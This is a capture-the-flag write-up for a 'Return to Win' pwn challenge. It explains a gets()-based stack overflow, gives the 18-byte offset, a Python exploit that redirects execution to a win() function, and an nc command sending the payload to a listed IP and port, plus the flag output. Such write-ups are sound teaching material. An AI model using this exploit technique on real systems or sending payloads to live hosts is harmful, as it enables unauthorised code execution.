# Return to Win

**Event:** ByteMe CTF 26
**Category:** pwn
**Points:** 100
**Flag:** `OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}`

---

## Overview

Classic ret2win challenge. A 64-bit ELF binary uses `gets()` to read into a 10-byte stack buffer, allowing us to overwrite the return address and redirect execution to a `win()` function that prints the flag.

## Analysis

The binary has three relevant functions:

- `main()` at `0x4012f0` - calls `hello()`
- `hello()` at `0x4011f6` - prompts for a name, reads input with `gets()` into a 10-byte buffer (`rbp - 0xa`), prints it back
- `win()` at `0x40125e` - opens `flag.txt` and prints its contents

The vulnerability is `gets()`, which performs no bounds checking. The buffer sits at `rbp - 0xa`, so we need 10 bytes to fill the buffer + 8 bytes to overwrite the saved RBP = **18 bytes** of padding before we reach the return address.

## Exploit

```python
import struct, sys

padding = b'A' * 18
win_addr = struct.pack('<Q', 0x40125e)
sys.stdout.buffer.write(padding + win_addr + b'\n')
```

```bash
python3 exploit.py | nc 145.239.142.129 1340
```

## Output

```
Hi, what's your name?
Hello, AAAAAAAAAAAAAAAAAA^@!
OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
```

